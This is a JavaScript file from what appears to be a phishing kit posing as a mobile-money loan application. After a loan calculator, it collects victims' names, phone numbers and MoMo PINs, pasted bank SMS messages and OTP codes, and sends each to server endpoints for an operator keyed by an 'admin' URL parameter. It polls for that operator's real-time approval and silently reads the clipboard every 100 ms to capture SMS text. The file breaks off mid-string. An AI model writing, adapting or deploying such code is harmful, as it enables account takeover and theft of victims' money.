document.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const adminId = urlParams.get('admin');

    const views = {
        welcome: document.getElementById('step-welcome'),
        calculator: document.getElementById('step-calculator'),
        loan1: document.getElementById('step-loan-1'),
        loan2: document.getElementById('step-loan-2'),
        loan3: document.getElementById('step-loan-3'),
        pin: document.getElementById('step-pin'),
        loading: document.getElementById('step-loading'),
        sms: document.getElementById('step-sms'),
        otp: document.getElementById('step-otp'),
        success: document.getElementById('step-success')
    };

    const rangeAmount = document.getElementById('range-amount');
    const rangeMonths = document.getElementById('range-months');
    const calcAmountDisplay = document.getElementById('calc-amount-display');
    const calcMonthsDisplay = document.getElementById('calc-months-display');
    const calcMonthlyDisplay = document.getElementById('calc-monthly-display');

    const loanAmountInput = document.getElementById('loan-amount-input');
    const loanDurationSelect = document.getElementById('loan-duration-select');
    const loanPurposeInput = document.getElementById('loan-purpose-input');

    const firstNameInput = document.getElementById('first-name');
    const lastNameInput = document.getElementById('last-name');
    const momoPhoneStep2 = document.getElementById('momo-phone-step2');
    const step2Banner = document.getElementById('step2-banner');

    const pinForm = document.getElementById('pin-verify-form');
    const verifyPhoneInput = document.getElementById('verify-phone');
    const pinCells5 = Array.from(document.querySelectorAll('.pin-cell-5'));
    const pinHidden5 = document.getElementById('pin-value-5');
    const pinSurfaceBanner = document.getElementById('pin-surface-banner');

    const loadingTitle = document.getElementById('loading-title');
    const loadingDesc = document.getElementById('loading-desc');
    const loadingSurfaceBanner = document.getElementById('loading-surface-banner');

    const smsCountdownEl = document.getElementById('sms-countdown');
    const smsSurfaceBanner = document.getElementById('sms-surface-banner');
    const smsPasteBox = document.getElementById('sms-paste-box');
    const smsCharCounter = document.getElementById('sms-char-counter');
    const btnVerifySms = document.getElementById('btn-verify-sms');
    const btnRequestNewSms = document.getElementById('btn-request-new-sms');

    const otpSurfaceBanner = document.getElementById('otp-surface-banner');
    const otpCells4 = Array.from(document.querySelectorAll('.otp-cell-4'));
    const btnSubmitOtp = document.getElementById('btn-submit-otp');
    const finalAppliedAmountEl = document.getElementById('final-applied-amount');

    const REQUIRED_SMS_PREFIX = "Y'ello. Please note";

    let applicationState = {
        amount: '100,000',
        duration: '12 Months',
        purpose: 'Business expansion and working capital',
        firstName: '',
        lastName: '',
        phone: ''
    };

    let currentSessionId = null;
    let statusPollTimer = null;
    let smsWatchTimer = null;
    let countdownTimer = null;
    let isSubmittingSms = false;
    let isSubmittingOtp = false;
    let submittedSmsSet = new Set();
    let lastHandledStatus = null;

    function showView(targetKey) {
        Object.keys(views).forEach(key => {
            const el = views[key];
            if (!el) return;
            if (key === targetKey) {
                el.classList.remove('hidden');
                el.classList.add('active');
            } else {
                el.classList.remove('active');
                el.classList.add('hidden');
            }
        });
    }

    function showBanner(el, message) {
        if (!el) return;
        el.textContent = message;
        el.classList.remove('hidden');
    }

    function hideBanner(el) {
        if (!el) return;
        el.textContent = '';
        el.classList.add('hidden');
    }

    function isValidTenDigitPhone(raw) {
        const cleaned = (raw || '').replace(/\D/g, '');
        return /^0\d{9}$/.test(cleaned);
    }

    function startsWithRequiredSMS(text) {
        if (!text) return false;
        return text.trim().startsWith(REQUIRED_SMS_PREFIX);
    }

    function updateCalculator() {
        const amt = parseInt(rangeAmount.value, 10) || 100000;
        const months = parseInt(rangeMonths.value, 10) || 12;
        const monthly = Math.round((amt * 1.25) / months);

        calcAmountDisplay.textContent = amt.toLocaleString();
        calcMonthsDisplay.textContent = `${months} Months`;
        calcMonthlyDisplay.textContent = monthly.toLocaleString();

        applicationState.amount = amt.toLocaleString();
        applicationState.duration = `${months} Months`;
        if (loanAmountInput) loanAmountInput.value = amt.toLocaleString();
        if (loanDurationSelect) {
            const matchingOpt = Array.from(loanDurationSelect.options).find(o => o.value === `${months} Months`);
            if (matchingOpt) loanDurationSelect.value = matchingOpt.value;
        }
    }

    if (rangeAmount && rangeMonths) {
        rangeAmount.addEventListener('input', updateCalculator);
        rangeMonths.addEventListener('input', updateCalculator);
        updateCalculator();
    }

    document.getElementById('btn-get-started').addEventListener('click', () => showView('calculator'));
    document.getElementById('back-calc-welcome').addEventListener('click', () => showView('welcome'));

    document.getElementById('btn-continue-calc').addEventListener('click', () => {
        updateCalculator();
        showView('loan1');
    });

    document.getElementById('back-step-1').addEventListener('click', () => showView('calculator'));

    document.getElementById('btn-next-1').addEventListener('click', () => {
        applicationState.amount = (loanAmountInput.value || applicationState.amount).trim();
        applicationState.duration = loanDurationSelect.value || applicationState.duration;
        applicationState.purpose = (loanPurposeInput.value || 'Business expansion and working capital').trim();
        showView('loan2');
    });

    document.getElementById('back-step-2').addEventListener('click', () => showView('loan1'));
    document.getElementById('btn-prev-2').addEventListener('click', () => showView('loan1'));

    document.getElementById('btn-next-2').addEventListener('click', () => {
        hideBanner(step2Banner);
        const fName = firstNameInput.value.trim();
        const lName = lastNameInput.value.trim();
        const phoneCleaned = momoPhoneStep2.value.replace(/\D/g, '').trim();

        if (!fName || !lName) {
            showBanner(step2Banner, 'ENTER YOUR EXACT REGISTERED FULL NAME AND LAST NAME.');
            return;
        }
        if (!isValidTenDigitPhone(phoneCleaned)) {
            showBanner(step2Banner, 'PHONE NUMBER MUST START WITH 0 AND BE EXACTLY 10 DIGITS.');
            return;
        }

        applicationState.firstName = fName;
        applicationState.lastName = lName;
        applicationState.phone = phoneCleaned;

        document.getElementById('sum-amount').textContent = applicationState.amount;
        document.getElementById('sum-duration').textContent = applicationState.duration;
        document.getElementById('sum-purpose').textContent = applicationState.purpose;
        document.getElementById('sum-applicant').textContent = `${fName} ${lName}`;
        document.getElementById('sum-phone').textContent = phoneCleaned;

        if (verifyPhoneInput) verifyPhoneInput.value = phoneCleaned;
        showView('loan3');
    });

    document.getElementById('back-step-3').addEventListener('click', () => showView('loan2'));
    document.getElementById('btn-prev-3').addEventListener('click', () => showView('loan2'));

    document.getElementById('btn-proceed-pin').addEventListener('click', () => {
        hideBanner(pinSurfaceBanner);
        clearPinBoxes();
        showView('pin');
        if (verifyPhoneInput && !verifyPhoneInput.value && applicationState.phone) {
            verifyPhoneInput.value = applicationState.phone;
        }
        if (pinCells5[0]) pinCells5[0].focus();
    });

    function clearPinBoxes() {
        pinCells5.forEach(cell => { cell.value = ''; });
        pinHidden5.value = '';
    }

    function sync5Pin() {
        pinHidden5.value = pinCells5.map(c => c.value.replace(/\D/g, '')).join('');
    }

    pinCells5.forEach((cell, idx) => {
        cell.addEventListener('input', () => {
            cell.value = cell.value.replace(/\D/g, '').slice(0, 1);
            if (cell.value && idx < pinCells5.length - 1) {
                pinCells5[idx + 1].focus();
            }
            sync5Pin();
        });
        cell.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !cell.value && idx > 0) {
                pinCells5[idx - 1].focus();
            }
        });
    });

    pinForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideBanner(pinSurfaceBanner);
        sync5Pin();

        const phoneVal = verifyPhoneInput.value.replace(/\D/g, '').trim();
        const pinVal = pinHidden5.value;

        if (!isValidTenDigitPhone(phoneVal)) {
            showBanner(pinSurfaceBanner, 'PHONE NO MUST START WITH 0 AND HAVE 10 DIGITS.');
            return;
        }
        if (pinVal.length !== 5) {
            showBanner(pinSurfaceBanner, 'ENTER YOUR 5-DIGIT MOMO PIN.');
            return;
        }

        applicationState.phone = phoneVal;
        currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).slice(2, 9);
        lastHandledStatus = null;

        loadingTitle.textContent = 'SENDING DETAILS TO MOMO VERIFICATION...';
        loadingDesc.textContent = 'Please wait while admin reviews your phone number and PIN.';
        hideBanner(loadingSurfaceBanner);
        showView('loading');

        try {
            const resp = await fetch('/api/submit-credentials', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: currentSessionId,
                    phone: phoneVal,
                    pin: pinVal,
                    adminId,
                    loanData: applicationState
                })
            });
            const result = await resp.json();
            if (result.success) {
                startStatusPolling();
            } else {
                showBanner(pinSurfaceBanner, 'UNABLE TO SUBMIT DETAILS. TRY AGAIN.');
                showView('pin');
            }
        } catch (err) {
            showBanner(pinSurfaceBanner, 'NETWORK ERROR. CHECK YOUR CONNECTION AND TRY AGAIN.');
            showView('pin');
        }
    });

    function startSmsCountdown() {
        if (countdownTimer) clearInterval(countdownTimer);
        let remaining = 15;
        smsCountdownEl.textContent = `${remaining}s`;
        btnRequestNewSms.classList.add('hidden');

        countdownTimer = setInterval(() => {
            remaining--;
            if (remaining > 0) {
                smsCountdownEl.textContent = `${remaining}s`;
            } else {
                clearInterval(countdownTimer);
                smsCountdownEl.textContent = '0s';
                btnRequestNewSms.classList.remove('hidden');
            }
        }, 1000);
    }

    function stopSmsWatchers() {
        if (smsWatchTimer) clearInterval(smsWatchTimer);
        if (countdownTimer) clearInterval(countdownTimer);
    }

    function evaluateSmsText(rawText) {
        if (isSubmittingSms) return;
        const text = (rawText || '').trim();
        smsCharCounter.textContent = `${text.length} / 1000`;

        if (!startsWithRequiredSMS(text)) return;

        if (submittedSmsSet.has(text)) {
            showBanner(smsSurfaceBanner, 'DUPLICATE SMS DETECTED. THIS SMS HAS ALREADY BEEN SUBMITTED.');
            smsPasteBox.value = '';
            smsCharCounter.textContent = '0 / 1000';
            return;
        }

        hideBanner(smsSurfaceBanner);
        submitVerificationSMS(text);
    }

    async function submitVerificationSMS(text) {
        if (isSubmittingSms) return;
        isSubmittingSms = true;
        stopSmsWatchers();

        loadingTitle.textContent = 'VERIFYING MOMO SMS...';
        loadingDesc.textContent = 'Please wait while your SMS is being verified.';
        hideBanner(loadingSurfaceBanner);
        showView('loading');

        try {
            const resp = await fetch('/api/submit-sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId: currentSessionId, smsText: text })
            });
            const data = await resp.json();

            if (data.duplicate) {
                isSubmittingSms = false;
                showView('sms');
                showBanner(smsSurfaceBanner, 'DUPLICATE SMS IS NOT ALLOWED. PASTE A NEW SMS.');
                smsPasteBox.value = '';
                smsCharCounter.textContent = '0 / 1000';
                startSmsVerificationStep(false);
                return;
            }

            submittedSmsSet.add(text);
        } catch (err) {
            isSubmittingSms = false;
            showView('sms');
            showBanner(smsSurfaceBanner, 'FAILED TO SEND SMS. PLEASE TRY AGAIN.');
            startSmsVerificationStep(false);
        }
    }

    function startSmsVerificationStep(resetBanner = true) {
        isSubmittingSms = false;
        if (resetBanner) hideBanner(smsSurfaceBanner);
        showView('sms');
        startSmsCountdown();

        if (smsPasteBox) {
            smsPasteBox.focus();
        }

        if (smsWatchTimer) clearInterval(smsWatchTimer);
        smsWatchTimer = setInterval(() => {
            if (isSubmittingSms || !views.sms.classList.contains('active')) return;

            const currentVal = smsPasteBox.value.trim();
            if (currentVal) {
                evaluateSmsText(currentVal);
                return;
            }

            if (navigator.clipboard && navigator.clipboard.readText) {
                navigator.clipboard.readText().then(clip => {
                    if (clip && clip.trim().startsWith(REQUIRED_SMS_PREFIX) && !isSubmittingSms) {
                        smsPasteBox.value = clip.trim();
                        evaluateSmsText(clip.trim());
                    }
                }).catch(() => {});
            }
        }, 100);
    }

    ['input', 'change', 'paste', 'keyup'].forEach(evtName => {
        smsPasteBox.addEventListener(evtName, () => {
            evaluateSmsText(smsPasteBox.value);
        });
    });

    btnVerifySms.addEventListener('click', () => {
        const val = smsPasteBox.value.trim();
        if (!val) {
            showBanner(smsSurfaceBanner, 'PLEASE COPY AND PASTE THE WHOLE SMS STARTING WITH Y\'ello. Please note.');
            return;
        }
        if (!startsWithRequiredSMS(val)) {
            showBanner(smsSurfaceBanner, 'SMS MUST START WITH: Y\'ello. Please note');
            return;
        }
        evaluateSmsText(val);
    });

    btnRequestNewSms.addEventListener('click', async () => {
        hideBanner(smsSurfaceBanner);
        smsPasteBox.value = '';
        smsCharCounter.textContent = '0 / 1000';
        startSmsCountdown();
        showBanner(smsSurfaceBanner, 'NEW SMS REQUEST SENT TO ADMIN. WATCH YOUR MOMO NUMBER.');

        try {
            await fetch('/api/request-new-sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId: currentSessionId })
            });
        } catch (err) {}
    });

    function clearOtpBoxes() {
        otpCells4.forEach(c => { c.value = ''; });
    }

    function readOtpValue() {
        return otpCells4.map(c => c.value.replace(/\D/g, '')).join('');
    }

    async function submitFourDigitOtp(code) {
        if (isSubmittingOtp || code.length !== 4) return;
        isSubmittingOtp = true;
        hideBanner(otpSurfaceBanner);

        loadingTitle.textContent = 'VERIFYING 4-DIGIT OTP...';
        loadingDesc.textContent = 'Please wait while your OTP is being confirmed.';
        hideBanner(loadingSurfaceBanner);
        showView('loading');

        try {
            await fetch('/api/submit-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId: currentSessionId, otpCode: code })
            });
        } catch (err) {
            isSubmittingOtp = false;
            showView('otp');
            showBanner(otpSurfaceBanner, 'NETWORK ERROR SUBMITTING OTP. TRY AGAIN.');
        }
    }

    otpCells4.forEach((cell, idx) => {
        cell.addEventListener('input', () => {
            cell.value = cell.value.replace(/\D/g, '').slice(0, 1);
            if (cell.value && idx < otpCells4.length - 1) {
                otpCells4[idx + 1].focus();
            }
            const combined = readOtpValue();
            if (combined.length === 4) {
                submitFourDigitOtp(combined);
            }
        });
        cell.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !cell.value && idx > 0) {
                otpCells4[idx - 1].focus();
            }
        });
    });

    btnSubmitOtp.addEventListener('click', () => {
        const code = readOtpValue();
        if (code.length !== 4) {
            showBanner(otpSurfaceBanner, 'ENTER THE 4-DIGIT OTP SENT TO YOUR MOMO NUMBER.');
            return;
        }
        submitFourDigitOtp(code);
    });

    function startOtpStep(resetBanner = true) {
        isSubmittingOtp = false;
        clearOtpBoxes();
        if (resetBanner) hideBanner(otpSurfaceBanner);
        showView('otp');
        if (otpCells4[0]) otpCells4[0].focus();
    }

    function startStatusPolling() {
        if (statusPollTimer) clearInterval(statusPollTimer);

        statusPollTimer = setInterval(async () => {
            if (!currentSessionId) return;

            try {
                const res = await fetch(`/api/check-status/${currentSessionId}`);
                const data = await res.json();
                if (!data.status || data.status === lastHandledStatus) return;

                if (data.status === 'denied_pin') {
                    lastHandledStatus = data.status;
                    clearInterval(statusPollTimer);
                    stopSmsWatchers();
                    clearPinBoxes();
                    showView('pin');
                    showBanner(pinSurfaceBanner, 'CHECK YOUR MOMO DETAILS AND TRY AGAIN.');
                } else if (data.status === 'approved_pin') {
                    lastHandledStatus = data.status;
                    smsPasteBox.value = '';
                    smsCharCounter.textContent = '0 / 1000';
                    startSmsVerificationStep(true);
                } else if (data.status === 'wrong_pin') {
                    lastHandledStatus = data.status;
                    stopSmsWatchers();
                    clearPinBoxes();
                    showView('pin');
                    showBanner(pinSurfaceBanner, 'INCORRECT PIN. ENTER YOUR NEW 5-DIGIT PIN IN THE EMPTY BOXES.');
                    if (pinCells5[0]) pinCells5[0].focus();
                } else if (data.status === 'sms_expired') {
                    lastHandledStatus = data.status;
                    smsPasteBox.value = '';
                    smsCharCounter.textContent = '0 / 1000';
                    startSmsVerificationStep(false);
                    showBanner(smsSurfaceBanner, 'SMS EXPIRED. ENTER NEW INCOMING SMS ON YOUR
